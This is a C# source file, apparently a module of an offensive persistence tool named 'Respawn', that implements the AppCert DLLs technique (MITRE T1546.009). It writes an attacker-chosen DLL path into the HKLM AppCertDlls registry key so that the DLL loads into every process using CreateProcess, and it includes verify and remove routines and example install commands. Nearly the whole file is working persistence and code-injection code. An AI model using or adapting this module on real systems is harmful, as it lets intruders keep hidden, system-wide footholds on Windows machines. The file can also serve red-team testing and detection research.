using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using System.IO;

namespace Respawn.Techniques.AppCert
{
    public class AppCertModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "appcert";
        public string Name        => "AppCert DLLs";
        public string Mitre       => "T1546.009";
        public string Description => "Abuse the AppCertDlls registry key. DLLs listed here are loaded into every process that calls the CreateProcess family of APIs, providing widespread persistence and code injection.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath = @"System\CurrentControlSet\Control\Session Manager\AppCertDlls";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Unique identifier for the entry (e.g. 'AppCert')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Full path to the DLL payload");
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t appcert -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t appcert -a install -n \"AppCert\" -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t appcert -a verify  -n \"AppCert\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t appcert -a remove  -n \"AppCert\"");
        }

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return AppCertKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true)
                                  ?? Microsoft.Win32.Registry.LocalMachine.CreateSubKey(RegPath, writable: true);

                if (baseKey == null)
                    return TechniqueResult.Denied("Access denied to AppCertDlls registry key.");

                if (baseKey.GetValue(ctx.Name) != null)
                    return TechniqueResult.Exists($"AppCert entry '{ctx.Name}' already exists.");

                // For AppCertDlls, the value name is usually the identifier and the data is the path
                baseKey.SetValue(ctx.Name, ctx.Payload);

                return TechniqueResult.Ok($"AppCert DLL installed: '{ctx.Name}' -> '{ctx.Payload}'. Payload will load into new processes.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null) return TechniqueResult.NotFound("AppCertDlls key not found.");

                if (baseKey.GetValue(ctx.Name) == null)
                    return TechniqueResult.NotFound($"AppCert entry '{ctx.Name}' not found.");

                baseKey.DeleteValue(ctx.Name);

                return TechniqueResult.Ok($"Removed AppCert DLL entry '{ctx.Name}'.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                string? dllPath = baseKey?.GetValue(ctx.Name) as string;

                if (string.IsNullOrEmpty(dllPath))
                    return TechniqueResult.NotFound($"No AppCert entry found for '{ctx.Name}'.");

                bool fileExists = File.Exists(dllPath);
                return TechniqueResult.Ok($"Verified AppCert entry '{ctx.Name}' -> '{dllPath}' (Exists: {fileExists})");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Error: {ex.Message}");
            }
        }

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            error = "";
            if (string.IsNullOrEmpty(ctx.Name)) { error = "Missing entry name (-n)"; return false; }
            if (requirePayload)
            {
                if (string.IsNullOrEmpty(ctx.Payload)) { error = "Missing DLL path (-p)"; return false; }
                if (!ctx.Payload.EndsWith(".dll", StringComparison.OrdinalIgnoreCase)) { error = "Payload must be a .dll file."; return false; }
            }
            return true;
        }
    }
}